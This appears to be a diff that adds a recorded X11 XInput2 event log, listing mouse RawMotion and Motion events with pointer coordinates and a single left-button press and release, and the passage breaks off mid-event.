+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.33 (2.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 680.38/9.89
+    event: 680.38/9.89
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 682.38
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.21 (2.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 682.59/9.89
+    event: 682.59/9.89
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 684.59
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 1.01 (1.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 684.60/9.89
+    event: 684.60/9.89
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 685.60
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.00 (3.00)
+          1: 2.00 (2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 685.60/9.89
+    event: 685.60/9.89
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 688.60
+        1: 11.89
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 5.00 (5.00)
+          1: 2.00 (2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 688.60/11.89
+    event: 688.60/11.89
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 693.60
+        1: 13.89
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.00 (3.00)
+          1: 1.00 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 693.60/13.89
+    event: 693.60/13.89
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 696.60
+        1: 14.89
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 7.00 (7.00)
+          1: 3.00 (3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 696.60/14.89
+    event: 696.60/14.89
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 703.60
+        1: 17.89
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 11.55 (10.00)
+          1: 4.62 (4.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 703.15/17.51
+    event: 703.15/17.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 715.15
+        1: 22.51
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 16.13 (11.00)
+          1: 7.33 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 715.28/22.84
+    event: 715.28/22.84
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 731.28
+        1: 29.84
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 19.11 (12.00)
+          1: 7.96 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 731.40/29.81
+    event: 731.40/29.81
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 750.40
+        1: 37.81
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 15.03 (11.00)
+          1: 5.47 (4.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 750.43/37.27
+    event: 750.43/37.27
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 765.43
+        1: 43.27
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 12.29 (11.00)
+          1: 3.35 (3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 765.73/43.63
+    event: 765.73/43.63
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 777.73
+        1: 46.63
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 14.23 (12.00)
+          1: 4.74 (4.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 777.95/46.37
+    event: 777.95/46.37
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 791.95
+        1: 51.37
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 16.44 (13.00)
+          1: 3.79 (3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 791.39/51.16
+    event: 791.39/51.16
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 808.39
+        1: 55.16
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 15.99 (12.00)
+          1: 4.00 (3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 808.38/55.16
+    event: 808.38/55.16
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 824.38
+        1: 59.16
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 1.57 (1.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 824.95/59.16
+    event: 824.95/59.16
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 825.95
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 6.29 (4.00)
+          1: 1.57 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 825.24/59.73
+    event: 825.24/59.73
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 832.24
+        1: 60.73
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 9.28 (6.00)
+          1: 1.55 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 832.52/60.28
+    event: 832.52/60.28
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 841.52
+        1: 62.28
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 5.19 (3.00)
+          1: 1.73 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 841.71/62.01
+    event: 841.71/62.01
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 846.71
+        1: 64.01
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.42 (2.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 846.14/64.01
+    event: 846.14/64.01
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 850.14
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 6.80 (4.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 850.94/64.01
+    event: 850.94/64.01
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 856.94
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 5.05 (3.00)
+          1: 1.68 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 856.98/64.69
+    event: 856.98/64.69
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 861.98
+        1: 65.69
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 1.62 (1.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 861.60/65.69
+    event: 861.60/65.69
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 863.60
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.86 (2.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 863.46/65.69
+    event: 863.46/65.69
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 866.46
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 4.66 (4.00)
+          1: -1.16 (-1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 866.12/65.53
+    event: 866.12/65.53
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 871.12
+        1: 64.53
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.04 (2.00)
+          1: -1.02 (-1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 871.15/64.51
+    event: 871.15/64.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 873.15
+        1: 63.51
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.00 (3.00)
+          1: -2.00 (-2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 873.15/63.51
+    event: 873.15/63.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 876.15
+        1: 61.51
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.00 (2.00)
+          1: -1.00 (-1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 876.15/61.51
+    event: 876.15/61.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 878.15
+        1: 60.51
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.00 (3.00)
+          1: -1.00 (-1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 878.15/60.51
+    event: 878.15/60.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 881.15
+        1: 59.51
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 4.00 (4.00)
+          1: -1.00 (-1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 881.15/59.51
+    event: 881.15/59.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 885.15
+        1: 58.51
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 4.00 (4.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 885.15/58.51
+    event: 885.15/58.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 889.15
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 6.00 (6.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 889.15/58.51
+    event: 889.15/58.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 895.15
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 6.00 (6.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 895.15/58.51
+    event: 895.15/58.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 901.15
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.00 (3.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 901.15/58.51
+    event: 901.15/58.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 904.15
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 6.00 (6.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 904.15/58.51
+    event: 904.15/58.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 910.15
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.00 (3.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 910.15/58.51
+    event: 910.15/58.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 913.15
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 5.00 (5.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 913.15/58.51
+    event: 913.15/58.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 918.15
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 5.00 (5.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 918.15/58.51
+    event: 918.15/58.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 923.15
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 7.00 (7.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 923.15/58.51
+    event: 923.15/58.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 930.15
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 7.16 (7.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 930.31/58.51
+    event: 930.31/58.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 937.31
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 7.81 (7.00)
+          1: 1.12 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 937.12/58.62
+    event: 937.12/58.62
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 945.12
+        1: 59.62
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 7.12 (6.00)
+          1: 1.19 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 945.24/59.81
+    event: 945.24/59.81
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 952.24
+        1: 60.81
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 7.54 (6.00)
+          1: 1.26 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 952.78/60.07
+    event: 952.78/60.07
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 959.78
+        1: 62.07
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.54 (2.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 959.32/62.07
+    event: 959.32/62.07
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 962.32
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.51 (2.00)
+          1: 1.26 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 962.83/62.33
+    event: 962.83/62.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 964.83
+        1: 63.33
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.73 (3.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 964.57/63.33
+    event: 964.57/63.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 968.57
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 1.10 (1.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 968.67/63.33
+    event: 968.67/63.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 969.67
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.00 (2.00)
+          1: 1.00 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 969.67/63.33
+    event: 969.67/63.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 971.67
+        1: 64.33
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 1.00 (1.00)
+          1: 1.00 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 971.67/64.33
+    event: 971.67/64.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 972.67
+        1: 65.33
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.00 (2.00)
+          1: 2.00 (2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 972.67/65.33
+    event: 972.67/65.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 974.67
+        1: 67.33
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.00 (2.00)
+          1: 1.00 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 974.67/67.33
+    event: 974.67/67.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 976.67
+        1: 68.33
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 1.00 (1.00)
+          1: 1.00 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 976.67/68.33
+    event: 976.67/68.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 977.67
+        1: 69.33
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 2.00 (2.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 977.67/69.33
+    event: 977.67/69.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 979.67
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 15 (RawButtonPress)
+    device: 2 (12)
+    detail: 1
+    flags:
+    valuators:
+
+EVENT type 4 (ButtonPress)
+    device: 12 (12)
+    detail: 1
+    flags:
+    root: 979.67/69.33
+    event: 979.67/69.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 16 (RawButtonRelease)
+    device: 2 (12)
+    detail: 1
+    flags:
+    valuators:
+
+EVENT type 5 (ButtonRelease)
+    device: 12 (12)
+    detail: 1
+    flags:
+    root: 979.67/69.33
+    event: 979.67/69.33
+    buttons: 1
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 0.89 (1.00)
+          1: 1.78 (2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 979.56/69.10
+    event: 979.56/69.10
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 980.56
+        1: 71.10
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 0.00 (0.00)
+          1: 3.62 (4.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 980.56/71.72
+    event: 980.56/71.72
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        1: 74.72
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.14 (-1.00)
+          1: 5.72 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 980.41/74.45
+    event: 980.41/74.45
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 979.41
+        1: 80.45
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.20 (-1.00)
+          1: 5.98 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 979.22/80.42
+    event: 979.22/80.42
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
